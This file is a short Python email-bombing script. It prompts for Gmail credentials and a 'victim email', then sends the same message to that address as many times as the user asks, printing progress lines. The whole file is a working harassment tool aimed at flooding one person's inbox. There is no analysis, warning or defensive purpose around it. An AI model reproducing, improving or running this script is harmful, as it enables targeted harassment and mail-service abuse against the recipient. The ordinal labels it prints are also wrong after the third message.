import os
import sys
import getpass
import smtplib

email = input('enter your e mail:')
pswd = getpass.getpass('enter your password:')

vemail = input('enter victim email:')

message = input('enter your message:')

count = int(input('how manay times do you want to send'))

print()

try:
    smtp_server = 'smtp.gmail.com'
    port = 587
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()
    server.starttls()
    server.login(email,pswd)
    print('sending in progress.........\n')
    i = 0
    while i < count:
        i+=1
        server.sendmail(email, vemail, message)
        if i == 1:
            print('[+] %dst email has been sent'%(i))
        elif i == 2:
            print('[+] %dnd email has been sent'%(i))
        elif i == 3:
            print('[+] %drd email has been sent'%(i))
        else:
            print('[+] %dst email has been sent'%(i))

        sys.stdout.flush()

    server.quit()
    print('[+] all done')

except KeyboardInterrupt:
    print()
    print('[x] canceled')
    sys.exit()

except smtplib.SMTPAuthenticationError:
    print ('username and password is wrong')
    sys.exit()